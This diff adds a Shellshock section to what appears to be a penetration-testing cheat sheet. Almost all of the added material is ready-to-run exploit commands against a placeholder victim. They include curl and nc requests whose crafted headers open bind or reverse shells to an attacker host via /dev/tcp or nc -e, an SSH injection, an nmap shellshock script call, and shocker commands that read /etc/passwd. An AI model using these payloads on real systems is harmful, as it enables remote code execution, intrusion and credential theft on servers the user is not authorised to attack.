@@ -105,6 +105,12 @@
   - [Port knocking bash script](#bash_script)
   - [Port knocking nmap port knocking](#nmap_port_knocking)
   - [Port knocking hping port knocking](#hping_port_knocking)
+- [Shell Shock](#Shellshock)
+  - [Shellshock manual_exploitation](#manual_exploitation)
+  - [Shellshock SSH exploitaion](#exploitaion_SSH)
+  - [Shellshock with nmap script](nmap_script)
+  - [Shellshock_via_smb](#smb)
+  - [Shellshock tool](#Shellshock_tool)
 --------------------------------------------------------------------------------------------------------------------------------
 ## Amazon_S3
 
@@ -898,3 +904,37 @@ nmap -Pn -p $i --host-timeout 100 --max-retries 0 [victim_ip];
 hping3 -S [victim_ip] -p 1 -c 1
 ```
 -------------------------------------------------------------------------------------------------------------------------------------
+# Shellshock
+
+## manual_exploitation
+
+- echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc [victim_ip] 80
+
+- curl -x TARGETADDRESS -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/HOSTIP/1234 0>&1" [victim_ip]/cgi-bin/status
+
+- curl http://[victim_ip]/path/to/cgi- bin/name_of_vuln_cgi -H "custom:() { ignored; }; /bin/bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1 "
+
+- curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/[your_ip]/[your_port] 0>&1' http://[victim_ip]/cgi-bin/test.sh
+
+
+## exploitaion_SSH
+```
+ssh username@$[victim_ip] '() { :;}; /bin/bash'
+```
+## nmap_script
+```
+nmap --script -p [victim_port] http-shellshock --script-args uri=[/vuln/path] cmd=[yours_command] [victim_ip]
+```
+## smb
+```
+#TODO
+```
+
+## Shellshock_tool
+***shocker***: https://github.com/nccgroup/shocker
+
+shocker sample:
+``` 
+python shocker.py -H [victim_ip]  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose;  ./shocker.py -H [victim_ip]  --command "/bin/cat /etc/passwd" -c /cgi-bin/admin.cgi --verbose
+```
+
